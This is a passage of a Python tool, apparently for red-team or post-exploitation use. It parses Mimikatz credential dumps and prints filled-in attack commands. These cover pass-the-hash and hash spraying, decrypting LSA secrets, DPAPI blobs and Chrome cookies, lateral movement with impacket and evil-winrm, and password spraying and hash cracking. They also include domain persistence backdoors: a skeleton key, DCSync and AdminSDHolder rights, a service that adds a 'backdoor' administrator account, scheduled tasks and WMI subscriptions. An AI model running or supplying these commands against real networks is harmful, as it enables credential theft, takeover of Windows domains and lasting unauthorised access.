        self.add_section("LOCAL SAM ACCOUNT ATTACKS")
        
        for entry in self.data.sam_entries:
            self.add_subsection(f"User: {entry.username}")
            
            self.add_cmd("PTH local admin", 
                f"crackmapexec smb <TARGETS> -u '{entry.username}' -H '{entry.ntlm}' --local-auth")
            self.add_cmd("Spray local hash across network", 
                f"crackmapexec smb <SUBNET>/24 -u '{entry.username}' -H '{entry.ntlm}' --local-auth")
            self.add_cmd("PsExec local", 
                f"impacket-psexec './{entry.username}@<TARGET>' -hashes ':{entry.ntlm}'")
    
    def generate_lsa_secret_attacks(self):
        if not self.data.lsa_secrets:
            return
        
        self.add_section("LSA SECRET ATTACKS")
        
        for secret in self.data.lsa_secrets:
            self.add_subsection(f"Secret: {secret.name}")
            
            if secret.name == "DPAPI_SYSTEM":
                self.add_cmd("Decrypt DPAPI with system key", 
                    f"mimikatz.exe \"dpapi::masterkey /in:<MASTERKEY_FILE> /system:{secret.data}\"")
            elif secret.name.startswith("_SC_"):
                svc = secret.name[4:]
                self.add_cmd(f"Service {svc} runs as", 
                    f"# Password: {secret.data}")
                self.add_cmd("Try credential", 
                    f"crackmapexec smb <TARGET> -u '<SERVICE_USER>' -p '{secret.data}'")
            elif secret.name == "DefaultPassword":
                self.add_cmd("AutoLogon password", 
                    f"# Password: {secret.data}")
            elif secret.name == "NL$KM":
                self.add_cmd("Decrypt cached credentials", 
                    f"mimikatz.exe \"lsadump::cache /nlkm:{secret.data}\"")
    
    def generate_dpapi_attacks(self):
        if not self.data.dpapi_keys:
            return
        
        self.add_section("DPAPI ATTACKS")
        
        for key in self.data.dpapi_keys:
            self.add_subsection(f"GUID: {key.guid}")
            
            self.add_cmd("Decrypt blob with masterkey", 
                f"mimikatz.exe \"dpapi::blob /in:<BLOB_FILE> /masterkey:{key.masterkey}\"")
            self.add_cmd("Decrypt Chrome cookies", 
                f"mimikatz.exe \"dpapi::chrome /in:'%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies' /masterkey:{key.masterkey}\"")
            self.add_cmd("SharpDPAPI", 
                f"SharpDPAPI.exe masterkeys /target:{key.guid} /key:{key.masterkey}")
    
    def generate_lateral_movement(self, creds: List[Credential]):
        valid_creds = [c for c in creds if (c.ntlm or c.password) and not c.is_machine_account]
        if not valid_creds:
            return
        
        self.add_section("LATERAL MOVEMENT")
        
        for c in valid_creds[:3]:
            domain = c.domain if c.domain else "DOMAIN"
            user = c.username
            
            self.add_subsection(f"{domain}\\{user}")
            
            if c.ntlm:
                # SMB/Admin shares
                self.add_cmd("Access C$ share", 
                    f"impacket-smbclient '{domain}/{user}@<TARGET>' -hashes ':{c.ntlm}'")
                
                # WMI
                self.add_cmd("WMI command execution", 
                    f"impacket-wmiexec '{domain}/{user}@<TARGET>' -hashes ':{c.ntlm}' 'hostname'")
                
                # DCOM
                self.add_cmd("DCOM MMC20", 
                    f"impacket-dcomexec -object MMC20 '{domain}/{user}@<TARGET>' -hashes ':{c.ntlm}' 'whoami'")
                
                # PSRemoting
                self.add_cmd("Evil-WinRM", 
                    f"evil-winrm -i <TARGET> -u '{user}' -H '{c.ntlm}'")
                
                # Network share enumeration
                self.add_cmd("Enumerate shares", 
                    f"crackmapexec smb <TARGET> -u '{user}' -H '{c.ntlm}' -d '{domain}' --shares")
                
                # Spider shares for sensitive files
                self.add_cmd("Spider shares", 
                    f"crackmapexec smb <TARGET> -u '{user}' -H '{c.ntlm}' -d '{domain}' -M spider_plus")
                
                # SCCM/MECM
                self.add_cmd("SCCM enumeration", 
                    f"crackmapexec smb <TARGET> -u '{user}' -H '{c.ntlm}' -d '{domain}' -M sccm")
    
    def generate_persistence(self, creds: List[Credential]):
        valid_creds = [c for c in creds if c.ntlm and not c.is_machine_account]
        if not valid_creds:
            return
        
        self.add_section("PERSISTENCE TECHNIQUES")
        
        c = valid_creds[0]
        domain = c.domain if c.domain else "DOMAIN"
        
        self.add_subsection("Skeleton Key")
        self.add_cmd("Inject skeleton key (password: mimikatz)", 
            "mimikatz.exe \"privilege::debug\" \"misc::skeleton\"")
        
        self.add_subsection("DCSync Backdoor")
        self.add_cmd("Add DCSync rights to user", 
            f"Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity '{c.username}' -Rights DCSync")
        
        self.add_subsection("AdminSDHolder")
        self.add_cmd("AdminSDHolder persistence", 
            f"Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity '{c.username}' -Rights All")
        
        self.add_subsection("Service Account")
        self.add_cmd("Create service for persistence", 
            f"sc \\\\<TARGET> create backdoor binPath= 'cmd.exe /c net user backdoor Password123! /add && net localgroup administrators backdoor /add'")
        
        self.add_subsection("Scheduled Task")
        self.add_cmd("Create scheduled task", 
            f"schtasks /create /s <TARGET> /u {domain}\\{c.username} /tn \"Backdoor\" /tr \"cmd.exe /c whoami\" /sc daily /st 09:00")
        
        self.add_subsection("WMI Event Subscription")
        self.add_cmd("WMI persistence", 
            f"impacket-wmipersist '{domain}/{c.username}@<TARGET>' -hashes ':{c.ntlm}' install -name 'Backdoor' -vbs 'CreateObject(\"WScript.Shell\").Run \"cmd\"'")
    
    def generate_credential_spraying(self, creds: List[Credential]):
        passwords = list(set([c.password for c in creds if c.password]))
        ntlms = list(set([c.ntlm for c in creds if c.ntlm and not c.is_machine_account]))
        
        if not passwords and not ntlms:
            return
        
        self.add_section("CREDENTIAL SPRAYING")
        
        domains = list(self.data.domains) if self.data.domains else ['DOMAIN']
        
        for domain in domains:
            self.add_subsection(f"Domain: {domain}")
            
            for pwd in passwords[:5]:
                self.add_cmd(f"Spray password", 
                    f"crackmapexec smb <DC_IP> -u users.txt -p '{pwd}' -d '{domain}' --continue-on-success")
                self.add_cmd(f"Spray password (Kerbrute)", 
                    f"kerbrute passwordspray -d '{domain}.local' --dc <DC_IP> users.txt '{pwd}'")
            
            for ntlm in ntlms[:3]:
                self.add_cmd(f"Spray NTLM hash", 
                    f"crackmapexec smb <SUBNET>/24 -u users.txt -H '{ntlm}' -d '{domain}' --continue-on-success")
    
    def generate_cracking_commands(self, creds: List[Credential]):
        ntlms = list(set([c.ntlm for c in creds if c.ntlm]))
        if not ntlms:
            return
        
        self.add_section("HASH CRACKING")
        
        self.add_subsection("Prepare Hash Files")
        self.output.append("# Save hashes to file:")
        for c in creds:
            if c.ntlm:
                self.output.append(f"# {c.username}:{c.ntlm}")
        self.output.append("")
        
        self.add_subsection("Hashcat Commands")
        self.add_cmd("NTLM (mode 1000)", 
            "hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule")
        self.add_cmd("NTLM with large ruleset", 
            "hashcat -m 1000 hashes.txt wordlist.txt -r rules/d3ad0ne.rule")
        self.add_cmd("NTLM bruteforce", 
            "hashcat -m 1000 hashes.txt -a 3 ?a?a?a?a?a?a?a?a")
        self.add_cmd("NetNTLMv2 (mode 5600)", 
            "hashcat -m 5600 ntlmv2.txt wordlist.txt")
        self.add_cmd("Kerberos TGS-REP (mode 13100)", 
            "hashcat -m 13100 tgsrep.txt wordlist.txt")
        self.add_cmd("Kerberos AS-REP (mode 18200)", 
            "hashcat -m 18200 asrep.txt wordlist.txt")
        
        self.add_subsection("John Commands")
        self.add_cmd("NTLM with John", 
            "john --format=NT hashes.txt --wordlist=wordlist.txt")
        self.add_cmd("John with rules", 
            "john --format=NT hashes.txt --wordlist=wordlist.txt --rules=best64")
        
        self.add_subsection("Online Lookup")
        self.add_cmd("CrackStation", 
            "# https://crackstation.net/")
        self.add_cmd("Hashes.org", 
            "# https://hashes.org/")
        for ntlm in ntlms[:5]:
            self.output.append(f"# Lookup: {ntlm}")


def main():
    parser = argparse.ArgumentParser(description='Parse Mimikatz output and generate attack commands')
    parser.add_argument('input_file', help='Path to mimikatz output file')
    parser.add_argument('-o', '--output', help='Output file (default: stdout)')
    parser.add_argument('-t', '--target', help='Target IP/hostname to use in commands', default='<TARGET>')
    parser.add_argument('-d', '--dc', help='Domain Controller IP/hostname', default='<DC_IP>')
    args = parser.parse_args()
    
    try:
        with open(args.input_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
    except FileNotFoundError:
        print(f"Error: File '{args.input_file}' not found", file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(f"Error reading file: {e}", file=sys.stderr)
        sys.exit(1)
    
    # Parse mimikatz output
    parser_obj = MimikatzParser(content)
    data = parser_obj.parse()
    
    # Generate attacks
    generator = AttackGenerator(data)
    output = generator.generate_all()
    
    # Replace placeholders
    output = output.replace('<TARGET>', args.target)
    output = output.replace('<DC_IP>', args.dc)
    
    # Output
    if args.output:
        with open(args.output, 'w') as f:
            f.write(output)
        print(f"Output written to {args.output}")
    else:
        print(output)


if __name__ == '__main__':
    main()
